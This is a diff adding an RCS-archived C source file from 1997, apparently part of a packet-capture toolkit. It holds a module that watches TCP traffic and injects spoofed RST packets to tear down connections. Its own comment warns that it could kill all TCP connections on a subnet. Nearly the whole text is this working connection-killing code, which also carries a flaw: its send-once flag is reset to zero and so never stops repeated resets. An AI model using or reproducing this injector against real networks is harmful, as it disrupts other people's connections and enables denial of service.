@@ -1,0 +1,127 @@
+head     1.1;
+branch   1.1.1;
+access   ;
+symbols  ipse-pcap:1.1.1.1 ipse-pcap:1.1.1;
+locks    ; strict;
+comment  @ * @;
+
+
+1.1
+date     97.06.17.01.09.04;  author gribble;  state Exp;
+branches 1.1.1.1;
+next     ;
+
+1.1.1.1
+date     97.06.17.01.09.04;  author gribble;  state Exp;
+branches ;
+next     ;
+
+
+desc
+@@
+
+
+
+1.1
+log
+@Initial revision
+@
+text
+@/* 
+   Created 5/14/97 -- kaminsky
+
+   This modules takes any packet that is passed in by the packet filter
+   and, if it has a valid ACK number, generates a fake packet in response.
+   The fake packet has its TCP RESET bit set which kills the connection.
+
+   The modules takes no arguments.
+
+   WARNING:  This module should NOT be used without a very specific BPF
+   filter.  It could potentially kill all of the TCP network connections
+   on a subnet.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "packet.h"
+#include "stream.h"
+#include "module.h"
+#include "uifile.h"
+#include <pcap.h>
+
+typedef struct {
+    int sent;
+} state_t;
+
+static void * tcpreset_init(int handid, char *arg)
+{
+    state_t *state = malloc(sizeof(state_t));
+    if (state == NULL) return (INIT_FAIL);
+    state->sent = 0;
+
+    return state;
+}
+
+static int tcpreset_handle(interface_t *interface, void *st)
+{
+    state_t *state = (state_t *)st;
+    int wd;
+    ip_packet_t *packet;
+    char *src_addr, *dst_addr;
+
+    /*
+    if (interface->frame_type == DLT_EN10MB) {
+    } else if (interface->frame_type == DLT_PPP) {
+    } else {
+    }
+    */
+
+    packet = interface->packet;
+    wd = interface->wd;
+
+    dst_addr = strdup(inet_ntoa(packet->iphead.ip_dst));
+    src_addr = strdup(inet_ntoa(packet->iphead.ip_src));
+
+    if ((state->sent == 0) &&
+	(packet->iphead.ip_p == IPPROTO_TCP) &&
+	(packet->p.tcp.head.th_flags & TH_ACK)) {
+	printf("Sending reset packet... %s:%d -> %s:%d\n",
+	       dst_addr,
+	       ntohs(packet->p.tcp.head.th_dport),
+	       src_addr,
+	       ntohs(packet->p.tcp.head.th_sport));
+
+	send_tcp(wd,
+		 "",
+		 0,
+		 packet->p.tcp.head.th_dport,
+		 packet->p.tcp.head.th_sport,
+		 packet->iphead.ip_dst.s_addr,
+		 packet->iphead.ip_src.s_addr,
+		 packet->p.tcp.head.th_ack,
+		 0,
+		 TH_RST);
+	state->sent = 0;
+    }
+
+    return 0;
+}
+
+static void tcpreset_clean(void *st)
+{
+    state_t *state = (state_t *)st;
+    free(state);
+}
+
+int nops = 1;
+module_ops oplist[] = { { tcpreset_init, tcpreset_handle, tcpreset_clean } };
+@
+
+
+1.1.1.1
+log
+@Wohoo--ipse over pcap!
+@
+text
+@@
